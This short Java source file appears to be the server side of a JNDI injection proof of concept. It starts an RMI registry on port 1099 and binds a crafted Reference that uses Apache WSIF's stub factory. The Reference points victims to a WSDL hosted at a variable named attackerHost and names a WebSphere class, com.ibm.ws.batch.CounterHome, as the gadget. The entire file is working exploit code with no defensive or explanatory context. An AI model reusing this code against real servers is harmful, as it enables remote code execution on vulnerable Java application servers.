import java.rmi.registry.Registry;
import java.rmi.registry.LocateRegistry;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

import org.apache.wsif.naming.*;
import javax.naming.*;
import com.sun.jndi.rmi.registry.*;

public class RMIServer {
    public static void main(String[] args) throws Exception {
        String attackerHost="127.0.0.1";
        System.setProperty("java.rmi.server.hostname", attackerHost); // While the RMI registry binds to 0.0.0.0, the individual services don't!
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference ref = new Reference(WSIFServiceStubRef.class.getName(), (String) null, (String) null);
        ref.add(new StringRefAddr("wsdlLoc", "http://"+attackerHost+":8000/poc.wsdl"));
        ref.add(new StringRefAddr("serviceNS", null));
        ref.add(new StringRefAddr("serviceName", null));
        ref.add(new StringRefAddr("portTypeNS", "http://wsifservice.addressbook/"));
        ref.add(new StringRefAddr("portTypeName", "Gadget"));
        ref.add(new StringRefAddr("preferredPort", "JavaPort"));
        ref.add(new StringRefAddr("className", "com.ibm.ws.batch.CounterHome"));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("poc", referenceWrapper);

    }
}